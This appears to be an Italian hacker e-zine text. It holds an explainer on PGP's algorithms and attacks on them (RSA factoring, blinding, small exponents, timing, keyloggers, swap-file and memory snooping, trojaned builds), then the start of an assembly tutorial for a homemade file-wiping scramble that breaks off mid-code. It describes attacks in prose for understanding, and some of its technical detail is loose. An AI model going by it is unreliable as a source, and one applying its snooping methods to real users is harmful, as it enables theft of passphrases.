                        (SICURAMENTE ADESSO LO SIETE! hi hi hi)

    -= Master *** =-
     Spp - Member
 Master@spippolatori.com
  www.spippolatori.com 

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°²²²°°°°°°°°°°°°°°°²²°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°²²²²°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²²°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

    //------------------------------------------------------------\\
    |             Gli Algoritmi in uso nel PGP                 **  |
    |               Analisi informativa del                      * |
    \\**     loro funzionamento e possibili attacchi               \
    /___*____________bY___[aLT255]_________________________________//


Il PGP e' considerato un sistema crittografico ibrido. In questo testo viene 
descritto il sistema RSA (esiste anche il DH/DSS che utilizza algoritmi 
differenti e viene tralasciato in questa trattazione), il suo 
funzionamento ed i tipi di attacco a cui puo' essere sottoposto. 

Il PGP e' formato da 4 differenti algoritmi: 

1) un protocollo a chiave simmetrica (IDEA);
2) un protocollo a chiave asimmetrica (RSA);
3) una procedura hash (MD5);
4) un generatore di numeri random (casuale).

Ognuno di questi e' soggetto ad un attacco differente.

1)				=*IDEA*= 

IDEA (International Data Encryption Algorithm), viene sviluppato a Zurigo,
in Svizzera, da Xuejia Lai e James Massei.
E' un block cypher (cioe' un tipo di algoritmo che dato un input variabile 
produce un output di lunghezza prefissata -block size-) che opera su blocchi 
di dati da 64-bit. Non essendoci stati finora vantaggi dall'uso della 
crittoanalisi sull'IDEA standard (per quel che si sa tutt'oggi, premetto 
che non so cosa sappia o cosa stia facendo l'NSA in questo momento, ma
suppongo non lo sappiate neanche voi...), l'unico metodo per attaccare questo
protocollo rimane il brute force.

IDEA utilizza chiavi di 128 bit di lunghezza.
Per recuperare una particolare chiave, si dovrebbe mediamente trovare la meta' 
delle chiavi.

Ma se anche aveste 1 miliardo di macchine che provassero 1 miliardo di chiavi
al sec. tutte queste macchine richiederebbero, per trovare la chiave, piu'
tempo del tempo che noi sappiamo esistere il nostro universo. Per cui, ora
come ora, questo protocollo risulta non vulnerabile ad un attacco di tipo
brute force puro e semplice.

2)				=*RSA*=

Introduciamo prima il significato del termine "fattorizzare" che verra' usato
in questo testo. Fattorizzare significa suddividere un numero intero in altri
numeri interi piu' piccoli (fattori) che moltiplicati insieme danno l'intero
originale.
Per esempio, i fattori di 15 saranno 5 e 3 (5x3=15) Fin qui tutto semplice.
Il problema si pone quando bisogna fattorizzare un intero i cui fattori siano
numeri primi. Moltiplicare 2 numeri interi e' semplice, moltiplicare 2 o piu'
numeri primi per ottenere l'intero cercato e' molto piu' difficile.
Non e' provato che fattorizzare il modulo pubblico (leggi piu' avanti per
capire cosa si intende per modulo pubblico) sia l'unica (e la migliore) via
per forzare l'RSA.
Ci sono modi ancora non scoperti per raggiungere questo scopo. Non e' stato 
neanche provato che fattorizzare grandi numeri interi sia cosi' difficile
quanto si pensi.
Esiste la possibilita' che un esperto in teoria dei numeri possa arrivare a
conoscere un algoritmo che fattorizzi a polinomi e che velocizzi il calcolo.
Ma niente di cio' e' ancora successo, e le attuali ricerche non puntano
comunque in questa direzione...
Per quanto riguarda quindi la fattorizzazione, cio' di cui dobbiamo tener
conto sono:

a) l'evoluzione delle tecniche per fattorizzare grandi numeri primi;
b) l'aumento della potenza di calcolo dei processori;
c) la diminuzione del costo dell'hardware.

Questi sono i punti che minacciano la sicurezza dell'RSA. 
Per focalizzare meglio il problema e' importante capire come realmente
funziona questo protocollo. Ecco un breve schemino:

1- prendi 2 numeri primi molto grandi, "p" e "q";
2- calcola il loro prodotto "n=pq" dove "n" e' il modulo;
3- scegli un numero, "e", minore di "n" e numero primo relativo di "(p-1)(q-1)".
   Cio' vuol dire che "e" e "(p-1)(q-1)" non hanno fattori in comune eccetto 1;
4- trova un'altro numero, "d", cosi' che "(ed-1)" sia divisibile per "(p-1)(q-1)";

Il valore "e" e' chiamato esponente "pubblico" e "d" esponente "privato".
La chiave pubblica e' la coppia (n,e); quella privata e' (n,d). I fattori p e q
dovrebbero essere messi nella chiave privata o distrutti. PGP li mantiene per
velocizzare i calcoli ma sono crittati.

La crittazione avviene dividendo il messaggio in blocchi piu' piccoli di "n" e
calcolando l'esponente modulo:

c=m^e modulo n (ricordate che "e" e' l'esponente pubblico e infatti il
                messaggio viene crittato con la chiave pubblica, "m" e' il
                messaggio in chiaro, "c" quello crittato)

La decrittazione e' semplicemente l'inverso:

m=c^d modulo n ("d" e' l'esponente privato)

Ottenere la chiave privata "d" dalla chiave pubblica (n,e) attualmente non e'
semplice.
Se si potesse fattorizzare "n" in "p" e "q" uno potrebbe ottenere la chiave
privata "d", ma la sicurezza dell'RSA si basa sul fatto che fattorizzare e'
difficile :)

Analizziamo l'attacco mediante brute force.
Fattorizzare "n" e' il miglior modo fin ora conosciuto per attaccare l'RSA,
provare a dedurre "(p-1)(q-1)" non e' piu' semplice di fattorizzare "n", e
compiere una ricerca esaustiva dei valori di "d" e' molto piu' difficile che
fattorizzare "n" !
Alcuni degli algoritmi utilizzati per la fattorizzazione sono questi:


-Trial division:  il piu' vecchio ed il meno efficiente. Prova tutti i numeri
                  primi che siano piu' piccoli della radice di (n);

-Quadratic Sieve (QS): l'algoritmo piu' veloce per numeri piu' piccoli di 110
                       cifre;

-Multiple Polynomial Quadratic Sieve (MPQS): una versione piu' veloce del QS;

-Double Large Prime Variation dell'MPQS: ancora piu' veloce (e' stato
                                         utilizzato per rompere l'RSA-129 nel
                                         1994);

-Number Field Sieve (NFS): attualmente l'algoritmo piu' veloce per numeri
                           maggiori di 110 cifre.

[Potrete trovare diversi testi sulla rete che trattano il funzionamento di
questi algoritmi, ho evitato di metterveli perche' comunque l'apprendimento
di alcuni di loro richiede un background di conoscenze matematiche non da
poco... e non riuscirei quindi neanche a commentarveli ;P ]

Questi algoritmi sono quelli che allo stato attuale rappresentano la sfida a
protocolli come l'RSA. Comunque, grazie all'evoluzione della potenza di
calcolo dei computer e le nuove conoscenze della teoria dei numeri,
fattorizzare grandi numeri sta diventando sempre piu' facile. Per esempio,
nel 1977 Ron Rivest disse che per fattorizzare un numero di 125 cifre
ci sarebbero voluti 40 milioni di miliardi di anni (penso che 40 quadrilioni
equivalgano a cio'... se no correggetemi).

Nel 1994 una RSA a 129 cifre fu fattorizzata alla velocita' di 5000 MIPS-year
(milioni di istruzioni per secondo) con il supporto di computer collegati in
internet, in circa 8 mesi.
Eccovi un'email di coloro che hanno rotto l'RSA-129 con una breve spiegazione:

##############################################################################
From: lenstra@BELLCORE.COM (Arjen Lenstra)
Newsgroups: sci.math.numberthy
Subject: rsa129
Date: 29 Apr 94 13:06:04 GMT

RSA-129 = 1143816257578888676692357799761466120102182967212423625625618429357069
35245733897830597123563958705058989075147599290026879543541 (129 digits)

Factors: 3490529510847650949147849619903898133417764638493387843990820577 * 3276 
9132993266709549961988190834461413177642967992942539798288533 //questi sono p e q Nd[aLT255]

Date: April 1994

Method: ppmpqs
Time: Approximately 5000 mips years

Name: Derek Atkins, Michael Graff, Arjen K. Lenstra, Paul Leyland, and more than
 600 volunteers
Email: lenstra@bellcore.com
--------------------------------------------------------------------------------

encoded message:

968696137546220614771409222543558829057599911245743198746951209308162\
98225145708356931476622883989628013391990551829945157815154

public exponent:

9007

`secret' exponent:

106698614368578024442868771328920154780709906633937862801226224496631\
063125911774470873340168597462306553968544513277109053606095

decoded message:

200805001301070903002315180419000118050019172105011309190800151919090\
618010705

decoded decoded message:

THE MAGIC WORDS ARE SQUEAMISH OSSIFRAGE

To find the factorization of RSA-129, we used the double large prime
variation of the multiple polynomial quadratic sieve factoring method.
The sieving step took approximately 5000 mips years, and was carried
out in 8 months by about 600 volunteers from more than 20 countries,
on all continents except Antarctica. Combining the partial relations
produced a sparse matrix of 569466 rows and 524338 columns. This matrix
was reduced to a dense matrix of 188614 rows and 188160 columns using
structured Gaussian elimination. Ordinary Gaussian elimination on this
matrix, consisting of 35489610240 bits (4.13 GigaByte), took 45 hours
on a 16K MasPar MP-1 massively parallel computer. The first three
dependencies all turned out to be `unlucky' and produced the trivial
factor RSA-129. The fourth dependency produced the above factorization.

Derek Atkins
Michael Graff
Arjen Lenstra
Paul Leyland

##############################################################################

Nel 1995 la Blacknet key (116 cifre) fu fattorizzata a 400 MIPS-year da
dozzine di workstation e un MasPar in 3 mesi. Viene riportata ora nella
tabella sotto una stima dei tempi richiesti per fattorizzare alcune chiavi
RSA basate sul PGP:

                 KeySize              MIPS-years required to factor
             -----------------------------------------------------------------
                  512                     30,000
                  768                     200,000,000
                  1024                    300,000,000,000
                  2048                    300,000,000,000,000,000,000

La tabella seguente mostra invece una stima delle equivalenze tra un brute
force che cerchi chiavi di protocolli simmetrici e brute force per
fattorizzare chiavi asimmetriche, usando l'NFS:

                Symmetric                       Asymmetric
             -----------------------------------------------------------------
                  56-bits                         384-bits
                  64-bits                         512-bits
                  80-bits                         768-bits
                  112-bits                        1792-bits
                  128-bits                        2304-bits

I 4 uomini che fattorizzarono la Blacknet key dissero che anche Organizzazioni
con risorse piu' modeste potrebbero benissimo riuscire a forzare chiavi a 512
bit in segreto. Questo certo non vuol dire che un organizzazione ha interesse
ad invenstire in un potenziale di calcolo di un certo livello per poter
leggere i messaggi altrui. Comunque, c'e' da rifletterci, e non c'e' da
sentirsi eccessivamente tranquilli ad usare quel sistema di crittaggio (a
512 bit), sapendo che puo' essere forzato...
Il mio suggerimento e' come sempre quello di usare la chiave piu' grande che
ci mette a disposizione quel programma. Se poi l'implementazione non permette
di usare una chiave grande abbastanza da soddisfare le vostre paranoie...
non la usate :)

-Attacchi esoterici all'RSA

Questi attacchi non si basano su delle debolezze proprie dell'RSA ma su
alcune implementazioni del protocollo. E comunque la maggior parte di queste
implementazioni non si ritrovano nel PGP.

-Attacchi cypher-text

L'attaccante riesce ad intercettare un messaggio cifrato "c", destinato ad
una terza parte.
Vuole essere in grado di leggere questo messaggio senza dover sopportare un
sforzo eccessivo di fattorizzazione, in poche parole vuole m=c^d.

Per recuperare "m", l'attaccante prima sceglie un numero casuale, minore di
"n" (lui ha la chiave pubblica che e' la coppia (e,n). Poi calcola:

x=r^e modulo n (encritta "r" con la chiave pubblica della sua vittima);

y=xc modulo n (moltiplica il messaggio cifrato "c",cyphertext, con il
               temporaneo "x")

t=r^-1 modulo n 

L'attaccante conta sul fatto che:

Se x=r^e modulo n, allora r=x^d modulo n

Quindi firma y con la sua chiave privata (che attualmente decritta y) e
spedisce u=y^d modulo n all'attaccante, che semplicemente calcola:

  tu modulo n = (r^-1)(y^d) modulo n = (r^-1)(x^d)(c^d) modulo n =
                (c^d) modulo n = m

 Per vanificare questa attacco basta non firmare con la propria chiave dei
 documenti che indistintamente vi presentano. Piuttosto usate una procedura
 hash one-way .

-Attacchi sull'esponente di crittazione "e"

Se l'esponente di crittazione "e" e' piccolo (valori comuni sono 3, 17 e
65537) allora le operazioni di calcolo che deve fare la chiave pubblica sono
significativamente piu' veloci.
L'unico problema ad usare un valore di "e" molto piccolo riguarda la
crittazione di brevi messaggi. Infatti assumendo "e=3" ed un "m" piu' piccolo
della radice cubica di "n", allora il messaggio si recupererebbe semplicemente
facendo la radice cubica di "m", perche':

m[for m<3rdroot(n)]^3 modulo n sara' equivalente a m^3

e percio':

3rdroot(m^3)=m.

Per difendersi contro questo attacco, bastera' semplicemente aggiungere prima
della crittazione caratteri o spazi, cosi' che m^3 sara' ridotto modulo n.

PGP usa un "e" piccolo come esponente di crittazione, per default e' 17. Se non
riesce a calcolare "d" con un "e=17" allora provera' con 19 e cosi' via...
PGP si preoccupa comunque di imbottire "m" con valori random cosi' che m>n.

-Timing Attack

Una nuova area di attacco pubblicamente scoperta da Paul Kocher si basa sul
fatto che differenti operazioni crittografiche (in questo caso l'esponente
modulo nelle operazioni dell'RSA) possono differire nell'ammontare di tempo
richiesto per il calcolo.
Se il calcolo dell'RSA fosse eseguito senza usare il Chinese Remainder
Theorem, varrebbe la seguente considerazione:

Un attaccante puo' esploitare le piccolissime differenze nel tempo di calcolo
dell'RSA, e in molti casi riuscirebbe a scoprire "d". L'attacco e' di tipo
passivo, chi lo esegue sta su un network ad osservare le operazioni RSA,
misurando il tempo "t" richiesto per il calcolo dell'operazione "m=c^d modulo
n". L'attaccante conosce inoltre "c" ed "n".
Uno pseudo codice potrebbe essere percio' il seguente:

        Algorithm to compute m=c^d mod n:

             Let m0 = 1.
             Let c0 = x.
             For i=0 upto (bits in d-1):
                     If (bit i of d) is 1 then
                             Let mi+1 = (mi * ci) mod n.
                     Else
                             Let mi+1 = mi.
                     Let di+1 = di^2 mod n.
             End.

Ron Rivest (la prima "R" in RSA e' la sua...) comunque rispose che per eludere
questo tipo di attacco bastava dare ad ogni operazione di calcolo un tempo
fisso, predeterminato, indipendente quindi dal tipo di operazione. Ed il PGP
infatti non e' vulnerabile a questo tipo di attacco perche' usa come detto
sopra il CRT (Chinese Remainder Theoreme) per velocizzare le operazioni
dell'RSA. Il Timing Attack richiede poi che la persona acceda al motore di
crittazione per ottenere accurati valori delle operazioni di decrittazione
o di crittazione con un certa varieta' di inputs. Se l'attaccante quindi
avesse questo tipo di accesso al sistema operativo, e nel caso del PGP
potesse leggere il secring.skr file, cio' renderebbe il PGP completamente
insicuro. Questo attacco comunque assume maggior rilevanza nell'uso delle
"smart cards" che usino l'RSA per l'identificazione della card.

3)				=*MD5*=

L'MD5 e' il metodo hash one-way (non reversibile) utilizzato per convertire la
passphrase nella chiave IDEA e per firmare i documenti. L'MD5 fu inventato da
Rivest come successore dell'MD4. E' piu' lento ma piu' sicuro del suo
predecessore. Come tutte le funzioni 1-way, l'MD5 prende una quantita'
arbitraria di bit in entrata e genera un output di grandezza predefinito.

Brute Force dell'MD5.

La forza di tutti i processi hash sta nel fatto che riesce molto bene a
randomizzare un messaggio arbitrario e produrne un output unico. Ci sono
2 tipi di attacchi comunque che si possono fare contro i procedimenti hash
1-way:

-il brute force puro;
-il birthday attack. 

Brute force puro:

L'output dell'MD5 e' 128 bits. Nel brute force puro, l'attaccante ha accesso
all'output del messaggio H(m). Vuole pero' trovare un'altro messaggio m' tale
che: H(m)=H(m')
Per trovare questo messaggio (assumendo che esista) ci vuole, per una macchina
che riesce a provare 1 miliardo di messaggi al secondo circa 1.07E22 anni
(anche per trovare m ci vorrebbe lo stesso ammontare di tempo).

Birthday attack:

Trovare 2 messaggi che diano lo stesso valore di hash e' conosciuto come una
collisione ed e' exploitabile dal birthday attack. Si tratta di un problema
di probabilita' statistica.
Dati "n" inputs e "k" possibili outputs, ci sono n(n-1)/2 coppie di inputs.
Per ogni coppia, c'e' la probabilita' di 1/k che ogni input produca lo stesso
output. Percio', se si prendono k/2 coppie, la probabilita' di trovarne una
che dia lo stesso valore di hash sara' del 50%.
Se n>sqrt(k), c'e' una buona possibilita' di trovare una collisione. Nel caso
dell'MD5, dovranno essere provati 2^64 messaggi. Se poteste provare 1.000.000
di messaggi al secondo ci vorrebbero 582.942 anni prima di trovare una
collisione (una macchina che ne riuscisse a fare 1 miliardo al secondo
richiederebbe circa 585 anni...).

-Altri tipi di attacchi all'MD5

Criptanalisi differenziali sono state provate con successo contro un primo
round di MD5, ma non contro tutti e 4 (ogni round applica la stessa
trasformazione usando delle sottochiavi; il set di sottochiavi, chiamato
keyschedule, deriva da una specifica funzione che conferisce al plaintext
il grado di sicurezza richiesto dall'utente).
C'e' stato un attacco effettuato con successo sulla stessa funzione di
compressione che genera le collisioni, cioe' si e' alterato il codice MD5 per
causare volontarie collisioni. Ma questo non ha grande senso e non e' un
problema per la sicurezza, perche' se la vostra copia di PGP avesse quel
codice alterato per causare queste collisioni, la verifica sull'autenticita'
di un messaggio fallirebbe per cui voi considerereste il messaggio di per
se' alterato...giusto?

-Lunghezza della Passphrase e Teoria dell'Informazione

Secondo la Teoria dell'Informazione convenzionale, la lingua inglese ha circa
1,3 bits di entropia (informazione) per carattere (8-bit). Se la passphrase
utilizzata e' abbastanza lunga, l'output dell'hash MD5 sara' statisticamente
casuale. Per un 128-bit di output MD5, una passphrase di circa 98 caratteri
produrra' una chiave casuale:

(8/1,3) * (128/8) = (128/1,3) = 98,46 caratteri

Quante persone utilizzano una passphrase di 98 caratteri per le loro chiavi
PGP? Ecco qua sotto 98 caratteri...

123456789012345678901234567890123456789012356789012345678901234567890123456789012345678 

Il valore 1,3 deriva dal fatto che un'arbitraria frase inglese leggibile, di
solito e' formata da certe lettere (e,r,s, e t sono statisticamente molto
comuni), che riducono la sua entropia. Se ognuna delle 26 lettere
dell'alfabeto latino avesse la stessa probabilita' di trovarsi in una frase
l'entropia aumenterebbe.
Gli indici assoluti, sarebbero in questo caso:

log(26) / log(2) = 4,7 bits 

In questo caso, una password con una vera sequenza casuale di lettere di
caratteri inglesi basterebbe essere di:

(8/4,7) * (128/8) = (128/4,7) = 27,23 caratteri

4)				=*IL PRNG*=

Il PGP utilizza 2 PRNG per generare e manipolare dati random:

- l' ANSI X9.17;
- e una funzione che misura l'entropia del ritardo nelle digitazioni a
  tastiera dell'utente.

----------------------- GLI ATTACCHI NELLA PRATICA--------------------------

La maggior parte degli attacchi delineati sopra non sono molto flessibili ne
molto possibili da attuare per un medio avversario. Ma allora, cosa rimane
da fare ad un cracker medio che vuole sovvertire la sicurezza del PGP?
Non certo attaccare il sistema di protocolli di crittazione, infatti questi
abbiamo visto sopra essere sicuri. Piuttosto e' possibile attaccare alcune
implementazioni specifiche del PGP.

- Attacchi passivi

* Keypress Snooping

  E' tutt'ora un validissimo metodo di attacco, e puo' sovvertire la sicurezza
  del piu' robusto sistema crittografico esistente. Se un attaccante riesce
  infatti ad installare un keylogger, e catturare la passphrase di un utente
  incauto, allora non ci sara' bisogno di alcun sistema di crittoanalisi.
  L'attaccante ha la passphrase per sbloccare la chiave privata RSA! Il
  sistema e' completamente compromesso. I metodi variano da sistema a sistema,
  ma secondo me le versioni  dos del PGP sono le piu' vulnerabili. Il DOS e'
  il sistema operativo piu' facile da sovvertire, tutto cio' che un attaccante
  dovra' riuscir a fare sara' semplicemente guadagnare l'accesso a quella
  macchina per meno di 5 minuti in due occasioni separate e l'attacco sara'
  completato. La prima volta per installare il software e la seconda per
  rimuoverlo e ritirare il pescato... (se la macchina sta su un network,
  tutto questo potra' essere fatto da remoto, e la facilita' dell'attacco
  aumentera' enormemente). Stesso discorso comunque vale per il sistema
  windows. Mentre un po' piu' complicato si fa per i sistemi Unix, perche' si
  richiede un accesso al sistema come root, a meno che la passphrase venga
  immessa da un'interfaccia X-Window. Agganciare la passphrase dalla tastiera,
  o anche interi messaggi dallo schermo tramite sistemi che captano le
  emissioni elettromagnetiche dello schermo sono degli attacchi molto validi.
  E quest'ultimo, perquanto possa sembrare un'azione alla James Bond, puo'
  essere facilmente attuata da tutti coloro che dispongono di buone conoscenze
  tecniche e desiderio di leggere files crittati.

* Memory Space Snooping

  In un sistema multiutente come Unix, la memoria fisica della macchina puo'
  essere esaminata da chiunque abbia certi privilegi (di solito di root).
  Piuttosto che fattorizzare numeri enormi, aprire la memoria virtuale del
  sistema (/dev/kmem), cercare una pagina utente e leggerla direttamente e'
  molto + semplice.

* Disk Cache Snooping

  Negli ambienti multitasking come Windows invece, il sistema operativo ha la
  bella abitudine di spostare il contenuto della memoria sul disco fisso, di
  solito in maniera trasparente all'utente, ogniqualvolta abbia necessita' di
  liberare altra RAM. Queste informazioni si possono trovare, quindi, in
  chiaro, nel file di swap (di lunghezza variabile...), semplicemente
  occorrera' aspettare che qualcuno si venga a trovare in quella situazione. 
  Ancora, in un ambiente di rete, dove l'accesso alle macchine puo' essere
  fatto con relativa impunita', questo file puo' essere recuperato senza che
  il proprietario se ne accorga e ne autorizzi la visione.  

* Packet Sniffing

  Se usate il PGP su un host alla quale accedete da remoto, potete essere vulnerabili a 
  questo attacco. A meno che non usiate qualche utility di crittazione per quella sessione, 
  come l'SSH o DESlogin, o altro. Un packet sniffer sistemato in un punto intermedio tra i 
  vostri terminali puo' recuperare in maniera completa ed efficiente tutti i vostri 
  messaggi...

- Attacchi attivi

* Trojan Horse

  Seppure sia un sistema molto antico, e' a tutt'oggi perfettamente funzionan
  te. Tra l'altro negli ultimi anni stanno sbucando una marea di programmi
  trojans per windows, friendly user, con una GUI (Graphic User Interface)
  semplicissima che qualsiasi utente puo' utilizzare premendo qualche pulsante
  e scorrendo qualche finestra di testo...

* Reworked Code

  Il codice del PGP e' pubblicamente disponibile. Ed e' facile da modificare.
  Se qualcuno modificasse il codice inserendo una backdoor e poi distribuisse
  il programma cosi' modificato in giro, si avrebbero degli effetti disastro
  si. Per fortuna, rilevare un PGP modificato e' molto semplice. Basterebbe
  fare un semplice controllo sulla somma dei bytes del programma (checksum).
  Ma anche questo potrebbe essere superato patchando il modulo MD5 per
  riportare un falso checksum, cio' e' possibile...e allora? cosa bisogna fare?
  Occorre verificare che si stia usando un copia fidata di quel programma. 

 				 CONCLUSIONI

TUTTO CIO' CHE HO PRESENTATO IN QUESTO TESTO SONO STATI DATI DI FATTO,
STATISTICHE E PROGETTI. TRAINE TU LE TUE CONCLUSIONI. FORSE MENTRE SCRIVO
QUESTO DOCUMENTO L'NSA HA TROVATO UN ALGORITMO DI FATTORIZZAZIONE POLINOMIALE
(LEGGI "VELOCE). NON PER QUESTO PERO' DOBBIAMO CONSIDERARE UN SISTEMA
CRITTOGRAFICO INEFFICIENTE A CAUSA DELLE NOSTRE PARANOIE. CERTO, NON POSSIAMO
PARLARE DI CERTEZZE E ASSUNZIONI DI SICUREZZA SUI SISTEMI CRITTOGRAFICI.
NEL CAMPO DELLA SICUREZZA INFORMATICA INFATTI, CONVIENE SEMPRE ESSERE MOLTO
CAUTI. MAI SBILANCIARSI. NON E' ALTRESI' UTILE COMUNQUE ESSERE DISINFORMATI
E PARANOICI FINO ALLA MORTE.

Il documento e' finito, spero sia servito a qualcuno per avere una sorta di
introduzione agli algoritmi del PGP, io personalmente son stato sempre
incuriosito dalle ermetiche risposte tipo: si tratta di fattorizzare grandi
numeri primi... senza sapere come funzionasse in pratica... allo stesso tempo
pero' vi ho evitato lunghe teorizzazioni sulla fattorizzazione che richiedeva
no delle conoscenze di matematica penso ben superiori alla media (ovviamente
anche del sottoscritto). Purtroppo ho trattato solo della chiave RSA,
nonostante che molti utilizzino invece il metodo Diffie-Hellman che ha pero'
altre fondamenta, ma penso che cmq sia servito per dare un'idea dell'approccio
matematico a questi algoritmi e i possibili exploit o attacchi.

Le fonti principali di questo lungo doc sono:

1) [The Feasibility of Breaking PGP] by infiNity [daemon9@netcom.com /
    route@infonexus.com];
2) PGP Faq;
3) linkz vari tipo questo:
   http://www.math.niu.edu/~rusin/known-math/index/11Y05.html

Per concludere qualche saluto in ordine sparso:

A tutto il gruppo RingZer0, Neu, Kill3x, Genius, aLoNg3x, +mala, alor, xerod,
e poi Quequero e tutti coloro che stanno seguendo e partecipando all'UIC, un
saluto a TiN_Man, a Guybrush, T3X, cod, BlackDruid, acidone, Ritz, e tutti
gli altri di #crack-it, un saluto a Brigante, Nobody88 e LordFelix, ai miei
amici [Jericho], _Akira, Gonzo, Veio, ^Isabel, Carletta, Dion, a tutti i
partecipanti al newsgruop i.s.a.m. e poi... non me ne vengono in mente altri,
forse perche' non sono importanti...naaaa scherzo !!! va beh a tutti coloro che
mi conoscono :)

Byez

[aLT255]

alt255@eudoramail.com
kz.cjb.net (Crittografia)
#crack-it
 
P.S. Ci sarebbe un saluto stronzo che vorrei fare... ma tanto so che non
leggera' mai questo doc e quindi lo evito va.... stronzaaaaaaaaaaaaaa !!!!!!
;))))) ...mi e' scappato...

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

            ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
            ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
            ÷³   ALGORITMO WIPE-WAY (PROTEGGIAMO I NOSTRI DATI   ³÷
            ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
            ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

----------------------------------intro---------------------------------------
Salve a tutti raga, nobo mi ha chiesto di scrivere una intro per
autorizzarlo ad usare per scopo di lucro i miei tute :)) okkei eccola:
Io Quequero De Quequeris autorizzo nobody88 a lucrare sui miei tutes :)))
Scherzi a parte tutti quanti i tute che trovate firmati a nome mio o di
qualche studente della UIC sono stati pubblicati con la mia piena
approvazione, ho autorizzato io il nostro caro redattore a saccheggiare il
sito quindi buona lettura, happy cracking e soprattutto non mi prendo
nessuna responsabilit… per l'uso improprio dei vari documenti, in realt…
sono un bugiardo e non ho scritto nulla o se l'ho fatto ero ubriaco o
comunque ero stato drogato da entit… oscure e maligne, se la presenza di
entit… maligne non potesse essere dimostrata, allora in quel momento ero
SICURAMENTE stato rapito dagli alieni oppure ero sotto shock dopo uno stupro
da parte di pi— modelle :))) quindi io non ho scritto nulla, se i documenti
sono firmati come Quequero vuol dire che qualche nemico sicuramente della
CIA mi vuole incastrare...Raga io non so niente so anal-fabeta :P se neanche
lo stupro potesse essere confermato ed il rapimento da parte di alieni
risultasse fallimentare allora in quel momento ero stato catturato da strani
gnomi viola radioattivi, non chiedetemi di sottopormi ad ipnosi regressiva
perch il mio cervello  stato formattato da un topo mutante ed ora ragiono
solo col BIOS...Buon divertimento con questa fantastica e-zine :)

Quequero
----------------------------------intro---------------------------------------


by "Quequero"
   
UIC's Home Page
Published by Quequero 

In questo tute vi insegnero' a creare un algoritmo wipe-way, cosa? Non lo
conoscete!!!!
   
Home page: http://quequero.cjb.net/   
E-mail: UIC@mail.usa.com UIC@bigfoot.com 
#uic #crack-it  UIC's form 
Difficolta' (X)NewBies ( )Intermedio ( )Avanzato ( )Master 
   
Abbiamo tutti la necessita' di dover proteggere i nostri dati ed in particolar
modo i gestori di sistemi informatici, bene adesso imparerete come proteggere
i vostri dati....cancellati.
------------------------------------------------------------------------------
Algoritmo Wipe-Way
(proteggiamo i nostri dati) 
Written by Quequero 

Introduzione 
 
Lo so che non conoscete gli algoritmi wipe-way ma e' ora di presentarli :) 

Tools usati

TASM 5.0 
Essay 

Salve a tutti, quest'oggi impareremo a creare un algoritmo di crittazione
wipe-way, in realta' il termine mi e' venuto in mente stanotte ma facciamo un
brevissima digressione e vediamo che tipi di algoritmi esistono.
Il primo e piu' usato tipo di algoritmo e' il Two-way cioe' prendo un documento
A, lo critto ed ottengo B se poi passo B sotto un filtro riottengo A e questo
mi sembra abbastanza banale, critazione-decrittazione, poi c'e' un altro tipo
di algoritmo il One-way cioe', prendo A, lo critto ottenendo B e poi ci serve
dio per riottenere A...In sostanza una volta crittato A non riotterrete mai
l'originile, a cosa serve quest'ultimo? Semplice in genere viene usato per
tenere le password, in un sistema durante il login l'utente inserisce una
password, questa viene crittata con l'algo One-way e confrontata con quella
(lo stesso crittata) contenuta nel file /etc/passwd, ma questi algoritmi
vengono usati anche in altri modi, si adottano per cancellare i file, il
perche' e' presto detto, come sapete quando gettate un file nel cestino e
poi lo eliminate bastano le norton utilities per recuperarlo, per questo
prima di gettare un file lo si puo' crittare con un algo One-way in modo
da renderlo indecifrabile anche una volta recuperato. In realta' non e' tutto
rosa e fiori perche' si puo' risalire, anche se con uno sforzo immane in tempi
di calcolo e tempo, al file originale, semplicemente prendendo una massa
enorme di dati, crittandola con quell'algo e poi confrontandola con il file
recuperato, prima o poi otterrete qualcosa di uguale ed avrete il file in
perfette condizioni. Ed e' qui che Queuqero vi viene in aiuto, perche' con
centomila semplici mosse :)))) creeremo un algo che critta i file in modo
abbastanza casuale e poi cercheremo di capirne l'efficacia, seguitemi.
Io vi presento qui sotto l'algoritmo e non tutto un intero programma, il
resto lo potete adattare voi secondo le vostre esigenze, io suppongo solo
che nel buffer....."buffer" siano contenuti i byte di una eventuale password
o di un eventuale file, vi spieghero' approfonditamente il funzionamento
dell'algoritmo alla fine:

Random1    dd 5809172h
Random2    dd  5371h 
.code 
START: 
        xor ecx, ecx 
algo: 
mov eax, Random1    
mul Random2                           
inc eax
mov ebx, dword ptr[buffer+ecx] 
ror ebx, 4 
shl ebx, 2 
xor ebx, eax 
ror ebx, 4 
shr ebx, 8 
xor ebx, eax 
call GetTickCount 
xor ebx, eax 
mov eax, ebx 
